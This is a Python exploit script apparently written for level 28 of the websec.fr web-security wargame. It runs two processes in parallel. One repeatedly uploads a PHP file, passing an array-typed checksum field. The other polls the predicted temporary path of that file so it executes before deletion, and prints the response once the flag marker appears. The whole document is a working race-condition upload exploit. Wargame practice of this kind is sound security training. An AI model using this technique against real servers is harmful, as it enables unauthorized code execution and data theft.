from hashlib import md5
import time
from multiprocessing import Process

import requests

URL="http://websec.fr/level28/"



def upload_file_and_checksum():
    while(1):
        file=open("level28.php","rb")

        payload={'checksum[]': '123', 'submit': 'Upload and check'}
        files = {'flag_file': ("level28.php", open("level28.php", 'rb'), 'application/octet-stream')}
        res=requests.post(f'{URL}/index.php',data=payload, files=files)
        print(res.text)

        print("Uploaded file")



def get_file():
    while(1):
        r=requests.get(f'{URL}/tmp/ef4319e14d3f05c9585570fa8dcc92f9.php')
        if(r.text.find("WEBSEC")!=-1):
            print(r.text)
            break
    print("leaving loop")






def main():
    p1 = Process(target = upload_file_and_checksum)
    p2 = Process(target = get_file)

    p1.start()
    p2.start()

if __name__ == '__main__':
    main()

    

